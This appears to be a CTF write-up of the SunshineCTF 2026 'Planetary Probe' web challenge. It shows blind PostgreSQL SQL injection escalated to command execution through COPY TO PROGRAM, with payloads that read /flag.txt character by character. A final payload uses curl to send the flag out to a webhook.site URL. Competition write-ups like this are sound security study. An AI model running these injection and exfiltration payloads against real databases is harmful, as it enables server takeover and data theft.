---
title: "Planetary Probe"
description: "Blind PostgreSQL SQL injection reaches command execution through COPY TO PROGRAM."
date: 2026-09-29
tags: [CTF, Web, SQL Injection, RCE, PostgreSQL, SunshineCTF]
category: "SunshineCTF 2026"
pinned: false
draft: false
---

# Planetary Probe

```
The Galactic Federation has opened public access to its Planetary Probe Directory, a database of known planets and their telemetry signatures. Your mission is to interface with the probe console and uncover hidden data the Federation would rather keep secret.

The console seems… minimal. No verbose errors, no detailed output — just “signal detected” or “no signal”. Can you find a way to communicate with the system, bypass its limited responses, and recover the hidden flag?
```

## Reconnaissance and confirming SQL injection

![alt text](image.png)

I tried the following inputs:

```text
MAR       -> Signal detected
EARTH     -> Signal detected
a         -> No signal
```

Testing two Boolean SQL conditions produced the following responses:

```text
' OR '1'='1' --  -> Signal detected
' OR '1'='2' --  -> No signal
```

## Fingerprinting and enumerating the database

Check the DBMS:

```text
`' OR length(version()) > 0 --`           -> Signal detected
`' OR length(@@version) > 0 -- -`         -> No signal
`' OR length(sqlite_version()) > 0 --`    -> No signal
```

This indicates that the backend is PostgreSQL.

## Stacked queries and program execution privileges

I tried stacked queries and found that the parameter accepts multiple statements:

```text
a'; SELECT 1 WHERE true; --   -> Signal detected
a'; SELECT 1 WHERE false; --  -> No signal
```

Next, I checked the role:

```text
' OR pg_has_role('pg_execute_server_program', 'member') --
```

The result was `Signal detected`. This privilege allows `COPY ... TO PROGRAM` to execute a command on the PostgreSQL host. Try the following command:

```text
a'; COPY (SELECT 1) TO PROGRAM 'test -r /etc/hostname; rc=$?; cat >/dev/null; exit $rc'; SELECT 1; --
```

`cat >/dev/null` consumes all data that `COPY` sends to `stdin`, preventing a
`broken pipe` error. The payload runs successfully and returns `Signal detected`.

This gives us RCE.

After obtaining RCE, I brute-forced the flag one character at a time using the command's exit code. Since the flag has the format `sun{...}`, the payload checks each position:

```text
a'; COPY (SELECT 1) TO PROGRAM 'test "$(cut -c1 /flag.txt)" = "s"; rc=$?; cat >/dev/null; exit $rc'; SELECT 1; --
a'; COPY (SELECT 1) TO PROGRAM 'test "$(cut -c2 /flag.txt)" = "u"; rc=$?; cat >/dev/null; exit $rc'; SELECT 1; --
a'; COPY (SELECT 1) TO PROGRAM 'test "$(cut -c3 /flag.txt)" = "n"; rc=$?; cat >/dev/null; exit $rc'; SELECT 1; --
a'; COPY (SELECT 1) TO PROGRAM 'test "$(cut -c4 /flag.txt)" = "{"; rc=$?; cat >/dev/null; exit $rc'; SELECT 1; --
....
```

- If the character is correct, the command exits with code `0`, `COPY` completes, and the final `SELECT 1` returns `Signal detected`.

- If it is incorrect, the command exits with a non-zero code and the request returns `No signal`.

This is very time-consuming because every position requires trying multiple characters. I therefore used the following payload to read the entire flag and send it to a webhook:

```text
a'; COPY (SELECT 1) TO PROGRAM 'cat >/dev/null & p=$!; F=$(head -n 1 /flag.txt); curl -G --data-urlencode "flag=$F" https://webhook.site/<TEMPORARY_TOKEN> >/dev/null 2>&1; rc=$?; wait $p; exit $rc'; SELECT 1; --
```

![alt text](image-1.png)

The webhook received:

![alt text](image-2.png)

## Flag

```text
sun{bl1nd_psqli_2_rc3_p4Nd0FyZt8k2}
```
